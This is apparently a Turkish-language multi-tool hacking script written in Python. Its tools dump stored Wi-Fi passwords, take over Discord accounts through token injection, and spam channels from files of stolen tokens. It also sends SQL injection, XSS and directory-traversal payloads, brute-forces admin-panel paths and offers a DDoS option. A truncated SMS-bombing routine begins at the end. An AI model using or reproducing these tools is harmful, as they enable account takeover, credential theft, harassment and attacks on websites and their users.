from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
import time
import webview
import webbrowser
import platform
import requests
from platform import node, system, release; Node, System, Release = node(), system(), release() 
from threading import Thread, active_count
from time import *
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime
import telebot
import threading
import asyncio
import aiohttp
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
import os
import subprocess
import sys
from bs4 import BeautifulSoup
import openpyxl
import random
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time as t
import socket
import itertools
from cryptography.fernet import Fernet
import requests, re , colorama ,random
from colorama import Fore, Back, Style
from requests.structures import CaseInsensitiveDict
import base64
import json
import os
import shutil
import sqlite3
import requests
from urllib.parse import urljoin
import logging
import threading
import time
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
import socket
import threading
import random
renkler = [Fore.BLUE, Fore.CYAN, Fore.GREEN, Fore.LIGHTBLUE_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTYELLOW_EX, Fore.WHITE,Fore.YELLOW] 
random_renk = random.choice(renkler)

print(random_renk,"")
user = str(input("User Name : "))

def text_to_binary(text):
    """Verilen metni ikilik (binary) kodlara çevirir."""
    binary_text = ''
    for char in text:
        binary_text += format(ord(char), '08b') + ' '
    return binary_text

def basic_encrypt_text(text):
    """Verilen metni harflerin yerine sayılarla değiştirerek şifreler."""
    encryption_dict = {
        'a': '1', 'b': '2', 'c': '3', 'ç': '4', 'd': '5', 'e': '6', 'f': '7', 'g': '8', 'ğ': '9', 'h': '10',
        'ı': '11', 'i': '12', 'j': '13', 'k': '14', 'l': '15', 'm': '16', 'n': '17', 'o': '18', 'ö': '19', 'p': '20',
        'r': '21', 's': '22', 'ş': '23', 't': '24', 'u': '25', 'ü': '26', 'v': '27', 'y': '28', 'z': '29',
        'A': '1', 'B': '2', 'C': '3', 'Ç': '4', 'D': '5', 'E': '6', 'F': '7', 'G': '8', 'Ğ': '9', 'H': '10',
        'I': '11', 'İ': '12', 'J': '13', 'K': '14', 'L': '15', 'M': '16', 'N': '17', 'O': '18', 'Ö': '19', 'P': '20',
        'R': '21', 'S': '22', 'Ş': '23', 'T': '24', 'U': '25', 'Ü': '26', 'V': '27', 'Y': '28', 'Z': '29'
    }
    encrypted_text = ''
    for char in text:
        encrypted_text += encryption_dict.get(char, char) + ' '
    return encrypted_text.strip()

def basic_decrypt_text(encrypted_text):
    """Şifrelenmiş metni çözer."""
    decryption_dict = {value: key for key, value in {
        'a': '1', 'b': '2', 'c': '3', 'ç': '4', 'd': '5', 'e': '6', 'f': '7', 'g': '8', 'ğ': '9', 'h': '10',
        'ı': '11', 'i': '12', 'j': '13', 'k': '14', 'l': '15', 'm': '16', 'n': '17', 'o': '18', 'ö': '19', 'p': '20',
        'r': '21', 's': '22', 'ş': '23', 't': '24', 'u': '25', 'ü': '26', 'v': '27', 'y': '28', 'z': '29',
        'A': '1', 'B': '2', 'C': '3', 'Ç': '4', 'D': '5', 'E': '6', 'F': '7', 'G': '8', 'Ğ': '9', 'H': '10',
        'I': '11', 'İ': '12', 'J': '13', 'K': '14', 'L': '15', 'M': '16', 'N': '17', 'O': '18', 'Ö': '19', 'P': '20',
        'R': '21', 'S': '22', 'Ş': '23', 'T': '24', 'U': '25', 'Ü': '26', 'V': '27', 'Y': '28', 'Z': '29'
    }.items()}
    
    decrypted_text = ''
    encrypted_parts = encrypted_text.split(' ')
    for part in encrypted_parts:
        decrypted_text += decryption_dict.get(part, part)
    return decrypted_text

def encrypt_text(text):
    encryption_dict = {
        'a': '219', 'b': '228', 'c': '237', 'ç': '246', 'd': '255', 'e': '264', 'f': '273', 'g': '282', 'ğ': '291', 'h': '2010',
        'ı': '1119', 'i': '1128', 'j': '1137', 'k': '1146', 'l': '1155', 'm': '1164', 'n': '1173', 'o': '1182', 'ö': '1191', 'p': '1200',
        'r': '1209', 's': '1218', 'ş': '1227', 't': '1236', 'u': '1245', 'ü': '1254', 'v': '1263', 'y': '1272', 'z': '1281',
        'A': '219', 'B': '228', 'C': '237', 'Ç': '246', 'D': '255', 'E': '264', 'F': '273', 'G': '282', 'Ğ': '291', 'H': '2010',
        'I': '1119', 'İ': '1128', 'J': '1137', 'K': '1146', 'L': '1155', 'M': '1164', 'N': '1173', 'O': '1182', 'Ö': '1191', 'P': '1200',
        'R': '1209', 'S': '1218', 'Ş': '1227', 'T': '1236', 'U': '1245', 'Ü': '1254', 'V': '1263', 'Y': '1272', 'Z': '1281'
    }
    encrypted_text = ''
    for char in text:
        encrypted_text += encryption_dict.get(char, char) + ' '
    return encrypted_text.strip()

def decrypt_text(encrypted_text):
    """Şifrelenmiş metni çözer."""
    decryption_dict = {
        '219': 'a', '228': 'b', '237': 'c', '246': 'ç', '255': 'd', '264': 'e', '273': 'f', '282': 'g', '291': 'ğ', '2010': 'h',
        '1119': 'ı', '1128': 'i', '1137': 'j', '1146': 'k', '1155': 'l', '1164': 'm', '1173': 'n', '1182': 'o', '1191': 'ö', '1200': 'p',
        '1209': 'r', '1218': 's', '1227': 'ş', '1236': 't', '1245': 'u', '1254': 'ü', '1263': 'v', '1272': 'y', '1281': 'z',
        '219': 'A', '228': 'B', '237': 'C', '246': 'Ç', '255': 'D', '264': 'E', '273': 'F', '282': 'G', '291': 'Ğ', '2010': 'H',
        '1119': 'I', '1128': 'İ', '1137': 'J', '1146': 'K', '1155': 'L', '1164': 'M', '1173': 'N', '1182': 'O', '1191': 'Ö', '1200': 'P',
        '1209': 'R', '1218': 'S', '1227': 'Ş', '1236': 'T', '1245': 'U', '1254': 'Ü', '1263': 'V', '1272': 'Y', '1281': 'Z'
    }
    decrypted_text = ''
    encrypted_parts = encrypted_text.split(' ')
    for part in encrypted_parts:
        decrypted_text += decryption_dict.get(part, part)
    return decrypted_text

def anonimChat():
    
    def oda_kodu_olustur():
        print("Random bir oda kodu için : 1\nOda kodunuzu kendiniz belirleyin : 2")
        secim = input("Lütfen bir seçim yapın : ")
        if secim == "1":
            return ''.join([str(random.randint(0, 9)) for _ in range(6)])
        elif secim == "2":
            return input("Lütfen 6 haneli bir oda kodu girin: ")

    def sunucu_baslat():
        ip = input("İp girin : ")
        sunucu_ip = f'{ip}'
        port = int(input("Port girin : "))
        sunucu_port = port
        istemciler = []
        istemciler_lock = threading.Lock()  # Lock for thread safety
        oda_kodu = oda_kodu_olustur()
        max_istemciler = int(input("Sohbet odasına izin verilen maksimum istemci sayısını girin: "))
        sunucu_nick = input("Bir nickname belirleyin: ")

        print(f"Sohbet Odası Kodu: {oda_kodu}")

        sunucu = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sunucu.bind((sunucu_ip, sunucu_port))
        sunucu.listen()

        print(f"Sunucu başlatıldı {sunucu_ip}:{sunucu_port}")

        def yayinla(mesaj, istemci_soketi=None):
            with istemciler_lock:
                for istemci in istemciler:
                    if istemci != istemci_soketi:
                        try:
                            istemci.send(mesaj)
                        except:
                            istemciler.remove(istemci)

        def istemciyi_yonet(istemci_soketi):
            try:
                isim = istemci_soketi.recv(1024).decode('utf-8')
                print(f"{isim} bağlandı.")
                istemci_soketi.send("Hoş geldiniz!".encode('utf-8'))
                while True:
                    mesaj = istemci_soketi.recv(1024)
                    if not mesaj:
                        break
                    print(f"{isim}: {mesaj.decode('utf-8')}")
                    yayinla(f"{isim}: {mesaj.decode('utf-8')}".encode('utf-8'), istemci_soketi)
            except Exception as e:
                print(f"Bir hata oluştu: {e}")
            finally:
                with istemciler_lock:
                    istemciler.remove(istemci_soketi)
                istemci_soketi.close()

        def mesaj_gonder():
            while True:
                mesaj = input(f"{sunucu_nick}: ")
                yayinla(f"{sunucu_nick}: {mesaj}".encode('utf-8'))

        def baglantilari_kabul_et():
            while True:
                if len(istemciler) < max_istemciler:
                    istemci_soketi, istemci_adresi = sunucu.accept()
                    print(f"Yeni bağlantı {istemci_adresi}")
                    with istemciler_lock:
                        istemciler.append(istemci_soketi)
                    thread = threading.Thread(target=istemciyi_yonet, args=(istemci_soketi,))
                    thread.start()
                else:
                    print("Maksimum istemci sayısına ulaşıldı, yeni bağlantılar kabul edilmiyor.")

        kabul_thread = threading.Thread(target=baglantilari_kabul_et)
        kabul_thread.start()

        gonder_thread = threading.Thread(target=mesaj_gonder)
        gonder_thread.start()

    def istemci_baslat():
        istemci = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        oda_kodu_giris = input("6 haneli Oda Kodunu girin: ")
        ip = input("İp girin : ")
        port = int(input("Port girin : "))

        try:
            istemci.connect((f'{ip}', port))
        except Exception as e:
            print(f"Sunucuya bağlanılamadı: {e}")
            return

        isim = input("Lütfen nickname giriniz: ")
        istemci.send(isim.encode('utf-8'))

        def mesajlari_al():
            while True:
                try:
                    mesaj = istemci.recv(1024).decode('utf-8')
                    print(mesaj)
                except:
                    print("Bir hata oluştu!")
                    istemci.close()
                    break

        def mesaj_gonder():
            while True:
                mesaj = input(f"{isim}: ")
                istemci.send(mesaj.encode('utf-8'))

        al_thread = threading.Thread(target=mesajlari_al)
        al_thread.start()

        gonder_thread = threading.Thread(target=mesaj_gonder)
        gonder_thread.start()

    def ana():
        print('''

    ____ ____ ____ ____ ____ ____ ____ ____ 
    ||H |||e |||J |||o |||C |||h |||a |||t ||
    ||__|||__|||__|||__|||__|||__|||__|||__||
    |/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|


    ''')
        rol = input("Oda oluşturmak için : 1\nOdaya katılmak için : 2\nÜst menüye dön").strip().lower()

        if rol == '1':
            sunucu_baslat()
        elif rol == '2':
            istemci_baslat()
        elif rol == '3':
            main()
        else:
            print("Geçersiz seçim. Lütfen '1' veya '2' yazın.")

    if __name__ == "__main__":
        ana()

def wifiAğları():
    
    while True:

        import subprocess

        print("Sistem analiz ediliyor")
        import time

        time.sleep(1)

        print("Bulunan Wifiler: ")

        veri = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        sistemler = [i.split(":")[1][1:-1] for i in veri if "All User Profile" in i]
        for i in sistemler:
            sonuç = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
                '\n')
            sonuç = [b.split(":")[1][1:-1] for b in sonuç if "Key Content" in b]
            try:
                print(" \\{:<30}| Şifre:  {:<}".format(i, sonuç[0]))
            except IndexError:
                print(" \\{:<30}| Şifre:  {:<}".format(i, ""))

        exe = int(input("\n \n \n1'e basarak yeniden sistemi analiz edebilirsiniz \n2'ye basarak çıkış yapabilirsiniz "))
        if (exe == 1):
            print("")
            import time

            time.sleep(1)


        elif (exe == 2):
            print("")
            import time

            time.sleep(1)
            break
            quit()

        else:
            print("Bir hata yaptınız lütfen tekrar deneyin")



def discord():
    def passwo():
        def get_token(username, password):
            login_url = "https://discord.com/api/v9/auth/login"
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            }
            login_payload = {
                "login": username,
                "password": password,
                "undelete": False,
                "captcha_key": None,
                "login_source": None,
                "gift_code_sku_id": None,
            }


            response = requests.post(login_url, json=login_payload, headers=headers)

            if response.status_code == 200:
                token = response.json().get('token')
                print(f"Alınan token: {token}")
                return token
            else:
                print(f"Login failed: {response.status_code} - {response.text}")
                return None

        def login_and_join(token):
            
            headers = {
                "Authorization": token,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            }
            

            user_info_url = "https://discord.com/api/v9/users/@me"
            response = requests.get(user_info_url, headers=headers)
            
            if response.status_code == 200:
                print("User info retrieved successfully")
                print(response.json())
            else:
                print(f"Failed to retrieve user info: {response.status_code} - {response.text}")

        username = input("Discord'a kayıtlı mail adresi: ")
        password = input("Discord şifresi: ")

        token = get_token(username, password)

        if token:
            login_and_join(token)

    def degistir():
        m = str(input("Yeni ismi girin : "))
        ff = input("Yeni pp dosya yolu giriniz : ")
        tok = input("Tokeni giriniz : ")
        import discord

        client = discord.Client(intents=discord.Intents.all())

        @client.event
        async def on_ready():
            # Get the bot's user object.
            bot = client.user
            
            # Set the bot's name and description.
            new_name = m
            
            # Change the bot's name and description.
            await bot.edit(username=new_name)
            

            # Change the bot's profile picture (avatar).
            with open(ff, "rb") as avatar_file:
                await bot.edit(avatar=avatar_file.read())

        # Run the bot with your token
        client.run(tok)

    def sel():
        def login_and_join(token, gecko_driver_path):

            firefox_options = Options()
            firefox_options.set_preference("dom.webdriver.enabled", False)
            firefox_options.set_preference('useAutomationExtension', False)
            firefox_options.headless = False  
            driver = webdriver.Firefox(service=Service(gecko_driver_path), options=firefox_options)


            driver.get("https://discord.com/login")

            script = """
            function login(token) {
                setInterval(() => {
                    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                }, 50);
                setTimeout(() => {
                    location.reload();
                }, 2500);
            }
            """
            driver.execute_script(script + f'login("{token}")')

            time.sleep(5)

        gecko_driver_path = input("GeckoDriver dosya yolu: ")
        token = input("Discord tokeni: ")
        login_and_join(token, gecko_driver_path)

    async def send_message(session, url, headers, message_data):
        async with session.post(url, headers=headers, json=message_data) as response:
            if response.status == 200:
                print('Message sent successfully.')
            else:
                print('An error occurred. Message could not be sent.')

    async def bump_channel(token, channel_id):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }


        message_content = input("Spam içeriği: ")
        tts_option = input("TTS aktif edilsinmi (True/False): ")
        num_times_to_send = int(input("Kaç saniyede 1 mesajı göndersin: "))

        message_data = {
            'content': message_content,
            'tts': bool(tts_option)
        }

        urls = [f'https://discord.com/api/v9/channels/{channel_id}/messages'] * num_times_to_send

        async with aiohttp.ClientSession() as session:
            tasks = []
            
            for url in urls:
                task = asyncio.ensure_future(send_message(session=session, url=url,
                                                        headers=headers,
                                                        message_data=message_data))
                tasks.append(task)

            await asyncio.gather(*tasks)

    async def spam_channel_from_file(token_file, channel_id):
        with open(token_file, 'r') as file:
            tokens = file.read().splitlines()

        tasks = [bump_channel(token, channel_id) for token in tokens]
        await asyncio.gather(*tasks)

    def spam():
        print('''
[1] Çoklu Spam
[2] Tekli Spam
[98] Üst Menü
[99] Çıkış
''')
        a = int(input(f"HeJo@{user}:~/SosyalMedyaTooları/Discord/Spam$ "))
        if a == 1:
            token_file = input("Token dosyası yolu: ")
            channel_id = input("Spam atılacak kanalın ID: ")
            
            loop = asyncio.get_event_loop()
            loop.run_until_complete(spam_channel_from_file(token_file, channel_id))
        
        elif a == 2:
            token = input("Tokeni giriniz: ")
            channel_id = input("Spam atılacak kanalın ID: ")
            
            loop = asyncio.get_event_loop()
            loop.run_until_complete(bump_channel(token=token, channel_id=channel_id))
        
        elif a == 98:
            discord()

        elif a == 99:
            print("Çıkış yapılıyor...")
            exit()

        else:
            print("Lütfen geçerli bir seçenek girin.")
    
    def j4j():
        yazı = '''
            __          __ __              __
            / /         / // /             / /
        __  / /         / // /_        __  / / 
        / /_/ /         /__  __/       / /_/ /  
        \____/            /_/          \____/   



        '''

        print(yazı)

        async def read_message_content():
            try:
                with open('mesaj.txt', 'r', encoding='utf-8') as file:
                    return file.read()
            except FileNotFoundError:
                print("Error: 'mesaj.txt' not found.")
                return None

        async def send_message(session, url, headers, message_data):
            async with session.post(url, headers=headers, json=message_data) as response:
                if response.status == 200:
                    print('Mesaj başarıyla gönderildi.')
                else:
                    print('Mesaj gönderilirken bir hata oluştu.')

        async def bump_channel(token, channel_id, delay_seconds):
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }

            # Read message content from 'mesaj.txt'
            message_content = await read_message_content()

            if message_content is None:
                return

            tts_option = input("TTS Etkinleştirilsin mi? (True/False) : ")
            num_times_to_send = int(input("Kaç kez gönderileceğini girin : "))

            message_data = {
                'content': message_content,
                'tts': bool(tts_option)
            }

            urls = [f'https://discord.com/api/v9/channels/{channel_id}/messages'] * num_times_to_send

            async with aiohttp.ClientSession() as session:
                tasks = []

                for url in urls:
                    task = asyncio.ensure_future(send_message(session=session, url=url,
                                                            headers=headers,
                                                            message_data=message_data))
                    tasks.append(task)
                    await asyncio.sleep(delay_seconds)  # Introduce the delay between messages

                await asyncio.gather(*tasks)

        x = input("Token : ")
        c = input("Mesaj gönderilecek kanal id : ")
        # Usage example with a delay of 5 seconds between messages
        token = x
        channel_id = c
        delay_seconds = int(input("Mesaj kaç saniyede bir gönderilsin : "))

        loop = asyncio.get_event_loop()
        loop.run_until_complete(bump_channel(token=token, channel_id=channel_id, delay_seconds=delay_seconds))

    print('''
    1 - token ile giriş
    2 - Şifre ile ayrıntılı bilgi alma
    3 - Spam 
    4 - Bilgileri değiştirme
    5 - J4J Botu
    98 - Üst Menü
    99 - Çıkış    
        ''')


    i = int(input(f"HeJo@{user}:~/SosyalMedyaTooları/Discord$ "))
    if i == 1:
        sel()
    elif i == 2:
        passwo()
    elif i == 3:
        spam()
    elif i ==4:
        degistir()
    elif i ==5:
        j4j()
    elif i == 98:
        sosyalMedyaToolları()
    elif i == 99:
        exit()
    else:
        print("Yanlış giriş")
def sitezafitey():
    # Loglama ayarları
    logging.basicConfig(level=logging.INFO, format='%(message)s')

    # Zafiyet testi için hedef URL
    target_url = input("Site adresi girin\nÖrnek : http://testphp.vulnweb.com : ")
    print("\n")


    # Kullanıcı ajanı (User Agent) belirleme
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
    }

    # SQL Injection testi
    def test_sql_injection(url):
        sql_payload = ''''
    ''
    `
    ``
    ,
    "
    ""
    /
    //
    \
    \\
    ;
    ' or "
    -- or # 
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    ' OR '' = '
    '='
    'LIKE'
    '=0--+
    OR 1=1
    ' OR 'x'='x
    ' AND id IS NULL; --
    '''''''''''''UNION SELECT '2
    %00
    /*…*/ 
    +		addition, concatenate (or space in url)
    ||		(double pipe) concatenate
    %		wildcard attribute indicator

    @variable	local variable
    @@variable	global variable


    # Numeric
    AND 1
    AND 0
    AND true
    AND false
    1-false
    1-true
    1*56
    -2


    1' ORDER BY 1--+
    1' ORDER BY 2--+
    1' ORDER BY 3--+

    1' ORDER BY 1,2--+
    1' ORDER BY 1,2,3--+

    1' GROUP BY 1,2,--+
    1' GROUP BY 1,2,3--+
    ' GROUP BY columnnames having 1=1 --


    -1' UNION SELECT 1,2,3--+
    ' UNION SELECT sum(columnname ) from tablename --


    -1 UNION SELECT 1 INTO @,@
    -1 UNION SELECT 1 INTO @,@,@

    1 AND (SELECT * FROM Users) = 1	

    ' AND MID(VERSION(),1,1) = '5';

    ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --


    Finding the table name


    Time-Based:
    ,(select * from (select(sleep(10)))a)
    %2c(select%20*%20from%20(select(sleep(10)))a)
    ';WAITFOR DELAY '0:0:30'--

    Comments:

    #	    Hash comment
    /*  	C-style comment
    -- -	SQL comment
    ;%00	Nullbyte
    `	    Backtick

    '''
        try:
            response = requests.get(url, params={"id": sql_payload}, headers=headers)
            if "syntax error" in response.text.lower() or "sql" in response.text.lower():
                logging.info(f"Zafiyet Türü: SQL Injection\nCiddiyet: High\nBulunan URL: {url}\nÖnerilen Çözüm: Hazır SQL sorguları (Prepared Statements) kullanarak SQL Injection saldırılarına karşı koruma sağlayın.\n")
        except requests.exceptions.RequestException as e:
            logging.error(f"SQL Injection testinde hata oluştu: {e}")

    # XSS testi
    def test_xss(url):
        xss_payload = "<script>alert('XSS');</script>"
        try:
            response = requests.get(url, params={"query": xss_payload}, headers=headers)
            if xss_payload in response.text:
                logging.info(f"Zafiyet Türü: XSS\nCiddiyet: Medium\nBulunan URL: {url}\nÖnerilen Çözüm: Girdi doğrulaması ve çıktı kodlaması kullanarak XSS saldırılarını önleyin.\n")
        except requests.exceptions.RequestException as e:
            logging.error(f"XSS testinde hata oluştu: {e}")

    # CSRF testi
    def test_csrf(url):
        csrf_payload = {"user_id": "1", "action": "delete"}
        try:
            response = requests.post(url, data=csrf_payload, headers=headers)
            if "forbidden" in response.text.lower() or "invalid token" in response.text.lower():
                logging.info(f"Zafiyet Türü: CSRF\nCiddiyet: High\nBulunan URL: {url}\nÖnerilen Çözüm: CSRF token kullanarak koruma sağlayın.\n")
        except requests.exceptions.RequestException as e:
            logging.error(f"CSRF testinde hata oluştu: {e}")

    # Clickjacking testi
    def test_clickjacking(url):
        try:
            response = requests.get(url, headers=headers)
            if "x-frame-options" not in response.headers:
                logging.info(f"Zafiyet Türü: Clickjacking\nCiddiyet: Medium\nBulunan URL: {url}\nÖnerilen Çözüm: X-Frame-Options header'ı ekleyerek koruma sağlayın.\n")
        except requests.exceptions.RequestException as e:
            logging.error(f"Clickjacking testinde hata oluştu: {e}")

    # Güvensiz cookie yönetimi testi
    def test_cookie_security(url):
        try:
            response = requests.get(url, headers=headers)
            if "Set-Cookie" in response.headers:
                if "HttpOnly" not in response.headers["Set-Cookie"] or "Secure" not in response.headers["Set-Cookie"]:
                    logging.info(f"Zafiyet Türü: Güvensiz Cookie Yönetimi\nCiddiyet: Medium\nBulunan URL: {url}\nÖnerilen Çözüm: HttpOnly ve Secure bayraklarını ekleyerek cookie güvenliğini sağlayın.\n")
        except requests.exceptions.RequestException as e:
            logging.error(f"Güvensiz cookie yönetimi testinde hata oluştu: {e}")

    # Dizin gezintisi testi
    def test_directory_traversal(url):
        traversal_payload = "../../etc/passwd"
        try:
            response = requests.get(urljoin(url, traversal_payload), headers=headers)
            if "root:x" in response.text:
                logging.info(f"Zafiyet Türü: Dizin Gezantisi\nCiddiyet: High\nBulunan URL: {url}\nÖnerilen Çözüm: Girdi doğrulaması yaparak dizin gezintisi saldırılarını önleyin.\n")
        except requests.exceptions.RequestException as e:
            logging.error(f"Dizin gezintisi testinde hata oluştu: {e}")

    # DDoS Koruması testi
    def test_ddos_protection(url):
        try:
            start_time = time.time()
            for _ in range(100):  # 100 istek gönderiyoruz
                response = requests.get(url, headers=headers)
                if response.status_code != 200:
                    logging.info(f"Sunucu {response.status_code} ile yanıt verdi. DDoS koruması olabilir.")
                    return
            elapsed_time = time.time() - start_time
            if elapsed_time > 5:  # Eğer işlemler 5 saniyeden fazla sürerse
                logging.info("Sunucu yanıt vermekte yavaşladı, DDoS koruması zayıf olabilir.")
            else:
                logging.info("Sunucu DDoS saldırısına karşı korunmasız görünüyor.")
                ddos_confirm = input("DDoS saldırısı yapmak ister misiniz? (evet/hayır): ")
                if ddos_confirm.lower() == "evet":
                    perform_ddos(url)
        except requests.exceptions.RequestException as e:
            logging.error(f"DDoS koruması testinde hata oluştu: {e}")

    # DDoS saldırısı
    def perform_ddos(url):
        logging.info("DDoS saldırısı başlatılıyor...")
        try:
            for _ in range(1000):  # 1000 istek gönderiyoruz
                response = requests.get(url, headers=headers)
                if response.status_code != 200:
                    logging.info(f"Sunucu {response.status_code} ile yanıt verdi.")
        except requests.exceptions.RequestException as e:
            logging.error(f"DDoS saldırısı sırasında hata oluştu: {e}")


    # Tarama işlemi
    def scan_vulnerabilities(url):
        test_threads = []

        # Testleri paralel olarak çalıştırma
        test_threads.append(threading.Thread(target=test_sql_injection, args=(url,)))
        test_threads.append(threading.Thread(target=test_xss, args=(url,)))
        test_threads.append(threading.Thread(target=test_csrf, args=(url,)))
        test_threads.append(threading.Thread(target=test_clickjacking, args=(url,)))
        test_threads.append(threading.Thread(target=test_cookie_security, args=(url,)))
        test_threads.append(threading.Thread(target=test_directory_traversal, args=(url,)))

        for thread in test_threads:
            thread.start()

        for thread in test_threads:
            thread.join()

    # Tarama başlatılıyor
    scan_vulnerabilities(target_url)

def adminPanelScan():

    lst = ('cpanel/','admin/','administrator/','login.php','administration/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
        'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp','/login.aspx',
        'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
        'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
        'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
        'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
        'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
        'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
        'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','administration','pages/admin/admin-login.html','admin/admin-login.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
        'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
        'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
        'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
        'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
        'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
        'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
        'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
        'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
        'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
        'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
        'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
        'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
        'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
        'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
        'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
        'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
        'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
        'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
        'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
        'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',)


    url = input("URL (Örnek : https://www.youtube.com) : ")
    print(f"HeJo@{user}:~/WebTooları$\nTarama başlıyor...")
    cnt =0
    for v in lst:
        try:
            req = requests.get(url+"/"+v)
            if req.status_code not in [404,403,401,402]:
                print(f" Bulunan : {url+'/'+v}")
                cnt+=1
        except:
            pass

    print(f"Tarama tamamlandı. {cnt} sonuçlar bulundu.")
def spotify():
    def download_spotify_song(spotify_url, output_dir):
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        try:
            subprocess.run(['spotdl', spotify_url, '--output', output_dir], check=True)
            print('İndirme tamamlandı!')
        except subprocess.CalledProcessError as e:
            print(f'İndirme başarısız: {e}')


    output_dir = "downloads"
    spotify_url = input('Spotify şarkı URL\'sini girin: ')
    
    if spotify_url:
        print('İndirme başlatılıyor...')
        download_spotify_song(spotify_url, output_dir)


def sms():
    os.system("pkg install figlet")
    os.system("clear")
    os.system("sms")
    try:
        import requests, urllib3, uuid
    except ImportError:
        print("Gerekli modüller indiriliyor...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests==2.28.2", "urllib3==1.26.13", "uuid==1.30"])
    finally:
        import concurrent.futures, json, os, random, requests, string, time, urllib, urllib3, uuid

    def a101(number):
        try:
            url = "https://www.a101.com.tr/users/otp-login/"
            payload = {
